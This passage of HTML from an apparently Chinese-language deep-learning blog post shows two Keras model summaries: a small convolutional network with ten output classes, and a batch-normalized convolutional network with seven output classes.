…
3</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">_________________________________________________________________</span><br><span class="line">Layer (type)                 Output Shape              Param #   </span><br><span class="line">=================================================================</span><br><span class="line">conv2d_1 (Conv2D)            (None, 28, 28, 32)        320       </span><br><span class="line">_________________________________________________________________</span><br><span class="line">activation_1 (Activation)    (None, 28, 28, 32)        0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">max_pooling2d_1 (MaxPooling2 (None, 14, 14, 32)        0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dropout_1 (Dropout)          (None, 14, 14, 32)        0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">conv2d_2 (Conv2D)            (None, 14, 14, 64)        18496     </span><br><span class="line">_________________________________________________________________</span><br><span class="line">activation_2 (Activation)    (None, 14, 14, 64)        0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">max_pooling2d_2 (MaxPooling2 (None, 7, 7, 64)          0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dropout_2 (Dropout)          (None, 7, 7, 64)          0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">flatten_1 (Flatten)          (None, 3136)              0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dense_1 (Dense)              (None, 128)               401536    </span><br><span class="line">_________________________________________________________________</span><br><span class="line">activation_3 (Activation)    (None, 128)               0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dropout_3 (Dropout)          (None, 128)               0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dense_2 (Dense)              (None, 64)                8256      </span><br><span class="line">_________________________________________________________________</span><br><span class="line">activation_4 (Activation)    (None, 64)                0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dropout_4 (Dropout)          (None, 64)                0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dense_3 (Dense)              (None, 10)                650       </span><br><span class="line">=================================================================</span><br><span class="line">Total params: 429,258</span><br><span class="line">Trainable params: 429,258</span><br><span class="line">Non-trainable params: 0</span><br></pre></td></tr></table></figure></p><p>训练code<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span clas
…
span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Layer (type)                 Output Shape              Param #   </span><br><span class="line">=================================================================</span><br><span class="line">conv2d_1 (Conv2D)            (None, 44, 44, 32)        832       </span><br><span class="line">_________________________________________________________________</span><br><span class="line">max_pooling2d_1 (MaxPooling2 (None, 22, 22, 32)        0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">batch_normalization_1 (Batch (None, 22, 22, 32)        128       </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dropout_1 (Dropout)          (None, 22, 22, 32)        0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">conv2d_2 (Conv2D)            (None, 18, 18, 64)        51264     </span><br><span class="line">_________________________________________________________________</span><br><span class="line">max_pooling2d_2 (MaxPooling2 (None, 9, 9, 64)          0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">batch_normalization_2 (Batch (None, 9, 9, 64)          256       </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dropout_2 (Dropout)          (None, 9, 9, 64)          0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">conv2d_3 (Conv2D)            (None, 7, 7, 128)         73856     </span><br><span class="line">_________________________________________________________________</span><br><span class="line">max_pooling2d_3 (MaxPooling2 (None, 3, 3, 128)         0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">batch_normalization_3 (Batch (None, 3, 3, 128)         512       </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dropout_3 (Dropout)          (None, 3, 3, 128)         0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">conv2d_4 (Conv2D)            (None, 2, 2, 128)         65664     </span><br><span class="line">_________________________________________________________________</span><br><span class="line">max_pooling2d_4 (MaxPooling2 (None, 1, 1, 128)         0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">flatten_1 (Flatten)          (None, 128)               0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dense_1 (Dense)              (None, 128)               16512     </span><br><span class="line">_________________________________________________________________</span><br><span class="line">activation_1 (Activation)    (None, 128)               0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dropout_4 (Dropout)          (None, 128)               0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dense_2 (Dense)              (None, 64)                8256      </span><br><span class="line">_________________________________________________________________</span><br><span class="line">activation_2 (Activation)    (None, 64)                0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dropout_5 (Dropout)          (None, 64)                0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dense_3 (Dense)              (None, 7)                 455       </span><br><span class="line">_________________________________________________________________</span><br><span class="line">activation_3 (Activation)    (None, 7)                 0         </span><br><span class="line">=================================================================</span><br><span class="line">Total params: 217,735</span><br><span class="line">Trainable params: 217,287</span><br><span class="line">Non-trainable params: 448</span><br><span class="line">_________________________________________________________________</span><br><span class="line">None</span
…
